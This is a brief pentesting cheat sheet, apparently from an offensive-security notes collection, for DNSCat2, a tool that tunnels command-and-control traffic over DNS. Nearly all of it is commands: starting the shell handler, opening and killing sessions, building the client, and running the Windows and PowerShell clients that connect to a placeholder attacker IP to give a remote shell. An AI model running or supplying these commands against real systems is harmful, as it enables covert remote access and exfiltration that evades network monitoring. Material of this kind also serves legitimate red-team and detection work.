# DNSCat2

## Shell Handler

```
$ sudo ./dnscat2.rb --dns server=<DNS_server_IP>,port=53

dnscat2> set security=open
```

```
dnscat2> session -i <session_ID>
```

```
dnscat2> kill <session_ID>
```

## Compile Payload

### Linux

```
$ cd dnscat2/client/ && make
```

### Windows

```
C:\> dnscat2-win32.exe --host <attacker_IP>
```

```
PS C:\> Start-Dnscat2 -Domain <domain>.<tld> -DNSServer <attacker_IP>
```

## Interactive Shell

TODO: Provide a usage example with dnscat2

```
command (<PLATFORM>) 1> help
```

---
## References

### Source Repositories

- [lukebaggett: DNSCat2 PowerShell Payload](https://github.com/lukebaggett/dnscat2-powershell)

- [avitex: Rust DNSCat](https://github.com/avitex/rust-dnscat)

### Pentestlab

- [Pentestlab Blog: Command and Control - DNS](https://pentestlab.blog/2017/09/06/command-and-control-dns/)